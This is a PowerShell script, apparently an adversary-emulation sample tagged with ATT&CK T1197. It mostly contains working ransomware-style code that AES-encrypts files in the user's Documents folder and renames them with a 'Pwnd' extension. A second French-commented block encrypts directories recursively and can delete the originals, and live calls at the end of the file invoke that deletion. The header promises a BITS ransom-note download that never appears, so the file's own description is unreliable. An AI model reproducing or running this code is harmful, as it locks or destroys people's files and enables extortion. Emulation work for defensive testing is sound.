# Donwload Ransom Note and stores it on User's Desktop 
# Technic ID : T1197
Clear-Host
Write-Output "==============================================================================="
Write-Output "BITS Job : Donwload RansomWare Note using Bitsadmin (T1197)"
Write-Output "==============================================================================="
################ [ VARIABLES ] ################
$DirectoryPath  = "$env:USERPROFILE\Documents";
$FilesMgmt      = "$env:PUBLIC\exf\Files_mgmt.txt";
$EncryptionKey  = "Encrypt!on-K3y"
$NewExtension   = "Pwnd"

function encrypt_files {
    param(
        [Parameter(Mandatory = $true)]
        [string]$DirectoryPath
        #    [string]$OutputFile = "hashes.txt"
    )

    # Check if directory exists
    if (-not (Test-Path $DirectoryPath)) {
        Write-Host "Directory can not be find." 
        exit
    }

$sha256 = [System.Security.Cryptography.SHA256]::create()
$key = $sha256.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($EncryptionKey));

#Creation  AES Object
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.KeySize = 256
$aes.Key = $key
$aes.GenerateIV()
$iv = $aes.IV

foreach ($file in Get-ChildItem $DirectoryPath)
{
    $FileName=$file.FullName;
    $FileCheckSum = Get-FileHash -Path $FileName -Algorithm SHA256
    Get-Content -Path $FileName -TotalCount 1 | Out-null;
    $NewFileName=$FileName+"."+$NewExtension
    Rename-Item -Path $file.FullName -NewName $NewFileName;
    # Read File content
    $PlainBytes = [System.IO.file]::ReadAllBytes($NewFileName);
   
#    $PlainBytes = [System.IO.file]::ReadAllBytes($FileName);
    # Create Encryptor
    $Encryptor = $aes.CreateEncryptor()
    # Encrypt Data
    $EncryptedBytes = $Encryptor.TransformFinalBlock($PlainBytes, 0, $PlainBytes.Length)
    # Merge IV + Encrypted Data
    $FinalBytes = $iv + $EncryptedBytes
    # Write Encrypted File
    [System.IO.File]::WriteAllBytes($NewFileName,$FinalBytes)
    Write-host "Original filename             : " $FileName  | Out-File -FilePath "$FilesMgmt" -Encoding ascii -Append    
    Write-host "Original File SHA256 checksum : " $($FileCheckSum.Hash)  | Out-File -FilePath "$FilesMgmt" -Encoding ascii -Append    
    Write-host "Encrypted Filename            : " $NewFileName  | Out-File -FilePath "$FilesMgmt" -Encoding ascii -Append    
    Write-host ""
}
}

function remove_double_extension {
$MatchEndingExtension = "\."+$NewExtension+"$"

$files = Get-ChildItem -Path $DirectoryPath -File | Where-Object { $_.Name -match $MatchEndingExtension }

foreach ($file in $files) {
    $newName = $file.Name -replace $MatchEndingExtension, ''
    $newPath = Join-Path $file.DirectoryName $newName
    Rename-Item -Path $file.FullName -NewName $newPath
    Write-Host "Renamed file : $($file.Name) -> $newName"
}
}

################ [ SCRIPT ] ################

################ [ TESTS ] ################

# Fonction pour chiffrer un fichier avec AES
function Encrypt-FileAES {
    param(
        [Parameter(Mandatory=$true)]
        [string]$InputFile,
        
        [Parameter(Mandatory=$true)]
        [string]$OutputFile,
        
        [Parameter(Mandatory=$true)]
        [byte[]]$Key,
        
        [Parameter(Mandatory=$true)]
        [byte[]]$IV
    )
    
    try {
        # Créer l'objet AES
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $Key
        $aes.IV = $IV
        
        # Créer l'encrypteur
        $encryptor = $aes.CreateEncryptor()
        
        # Lire le fichier source
        $inputBytes = [System.IO.File]::ReadAllBytes($InputFile)
        
        # Chiffrer les données
        $encryptedBytes = $encryptor.TransformFinalBlock($inputBytes, 0, $inputBytes.Length)
        
        # Écrire le fichier chiffré (IV + données chiffrées)
        $outputBytes = $IV + $encryptedBytes
        [System.IO.File]::WriteAllBytes($OutputFile, $outputBytes)
        
        # Nettoyer
        $encryptor.Dispose()
        $aes.Dispose()
        
        Write-Host "✓ Fichier chiffré: $InputFile -> $OutputFile" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Error "Erreur lors du chiffrement de $InputFile : $($_.Exception.Message)"
        return $false
    }
}

# Fonction pour générer une clé à partir d'un mot de passe
function Get-KeyFromPassword {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Password,
        
        [byte[]]$Salt = @(0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76),
        
        [int]$Iterations = 10000
    )
    
    $rfc2898 = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($Password, $Salt, $Iterations)
    return $rfc2898.GetBytes(32) # 256 bits pour AES-256
}

# Script principal
function Encrypt-DirectoryFiles {
    param(
        [Parameter(Mandatory=$true)]
        [string]$DirectoryPath,
        
        [Parameter(Mandatory=$true)]
        [string]$Password,
        
        [string]$FileFilter = "*.*",
        
        [switch]$Recursive,
        
        [switch]$DeleteOriginal,
        
        [string]$OutputSuffix = ".encrypted"
    )
    
    # Vérifier que le répertoire existe
    if (-not (Test-Path $DirectoryPath)) {
        Write-Error "Le répertoire '$DirectoryPath' n'existe pas."
        return
    }
    
    # Générer la clé à partir du mot de passe
    Write-Host "Génération de la clé de chiffrement..." -ForegroundColor Yellow
    $key = Get-KeyFromPassword -Password $Password
    
    # Obtenir la liste des fichiers
    $searchOption = if ($Recursive) { "AllDirectories" } else { "TopDirectoryOnly" }
    
    try {
        $files = Get-ChildItem -Path $DirectoryPath -Filter $FileFilter -File -Recurse:$Recursive
        
        if ($files.Count -eq 0) {
            Write-Warning "Aucun fichier trouvé avec le filtre '$FileFilter' dans '$DirectoryPath'"
            return
        }
        
        Write-Host "Fichiers à chiffrer: $($files.Count)" -ForegroundColor Cyan
        
        $successCount = 0
        $errorCount = 0
        
        foreach ($file in $files) {
            # Ignorer les fichiers déjà chiffrés
            if ($file.Name.EndsWith($OutputSuffix)) {
                Write-Host "Ignoré (déjà chiffré): $($file.Name)" -ForegroundColor Gray
                continue
            }
            
            # Générer un IV unique pour chaque fichier
            $aes = [System.Security.Cryptography.Aes]::Create()
            $iv = $aes.IV
            $aes.Dispose()
            
            # Définir le nom du fichier de sortie
            $outputFile = $file.FullName + $OutputSuffix
            
            # Chiffrer le fichier
            if (Encrypt-FileAES -InputFile $file.FullName -OutputFile $outputFile -Key $key -IV $iv) {
                $successCount++
                
                # Supprimer l'original si demandé
                if ($DeleteOriginal) {
                    try {
                        Remove-Item $file.FullName -Force
                        Write-Host "  → Fichier original supprimé" -ForegroundColor Yellow
                    }
                    catch {
                        Write-Warning "Impossible de supprimer le fichier original: $($_.Exception.Message)"
                    }
                }
            }
            else {
                $errorCount++
            }
        }
        
        Write-Host "`n=== RÉSUMÉ ===" -ForegroundColor Magenta
        Write-Host "Fichiers chiffrés avec succès: $successCount" -ForegroundColor Green
        Write-Host "Erreurs: $errorCount" -ForegroundColor Red
        
    }
    catch {
        Write-Error "Erreur lors du traitement du répertoire: $($_.Exception.Message)"
    }
}

# Exemple d'utilisation
# Encrypt-DirectoryFiles -DirectoryPath "C:\MonDossier" -Password "MonMotDePasseSecurise123!" -FileFilter "*.txt" -Recursive




# Fonction pour déchiffrer un fichier
function Decrypt-FileAES {
    param(
        [Parameter(Mandatory=$true)]
        [string]$InputFile,
        
        [Parameter(Mandatory=$true)]
        [string]$OutputFile,
        
        [Parameter(Mandatory=$true)]
        [byte[]]$Key
    )
    
    try {
        # Lire le fichier chiffré
        $encryptedData = [System.IO.File]::ReadAllBytes($InputFile)
        
        # Extraire l'IV (16 premiers octets)
        $iv = $encryptedData[0..15]
        $cipherText = $encryptedData[16..($encryptedData.Length - 1)]
        
        # Créer l'objet AES
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $Key
        $aes.IV = $iv
        
        # Créer le décrypteur
        $decryptor = $aes.CreateDecryptor()
        
        # Déchiffrer les données
        $decryptedBytes = $decryptor.TransformFinalBlock($cipherText, 0, $cipherText.Length)
        
        # Écrire le fichier déchiffré
        [System.IO.File]::WriteAllBytes($OutputFile, $decryptedBytes)
        
        # Nettoyer
        $decryptor.Dispose()
        $aes.Dispose()
        
        Write-Host "✓ Fichier déchiffré: $InputFile -> $OutputFile" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Error "Erreur lors du déchiffrement de $InputFile : $($_.Exception.Message)"
        return $false
    }
}

# Fonction pour déchiffrer un répertoire
function Decrypt-DirectoryFiles {
    param(
        [Parameter(Mandatory=$true)]
        [string]$DirectoryPath,
        
        [Parameter(Mandatory=$true)]
        [string]$Password,
        
        [string]$EncryptedSuffix = ".encrypted",
        
        [switch]$Recursive,
        
        [switch]$DeleteEncrypted
    )
    
    $key = Get-KeyFromPassword -Password $Password
    $files = Get-ChildItem -Path $DirectoryPath -Filter "*$EncryptedSuffix" -File -Recurse:$Recursive
    
    foreach ($file in $files) {
        $outputFile = $file.FullName -replace [regex]::Escape($EncryptedSuffix) + '$', ''
        
        if (Decrypt-FileAES -InputFile $file.FullName -OutputFile $outputFile -Key $key) {
            if ($DeleteEncrypted) {
                Remove-Item $file.FullName -Force
                Write-Host "  → Fichier chiffré supprimé" -ForegroundColor Yellow
            }
        }
    }
}

# Chiffrer tous les fichiers .txt dans un dossier
Encrypt-DirectoryFiles -DirectoryPath "C:\MesDonnees" -Password "MotDePasseSecurise123!" -FileFilter "*.txt"

# Chiffrer récursivement tous les fichiers et supprimer les originaux
Encrypt-DirectoryFiles -DirectoryPath "C:\MesDonnees" -Password "MotDePasseSecurise123!" -Recursive -DeleteOriginal

# Déchiffrer les fichiers
Decrypt-DirectoryFiles -DirectoryPath "C:\MesDonnees" -Password "MotDePasseSecurise123!" -Recursive

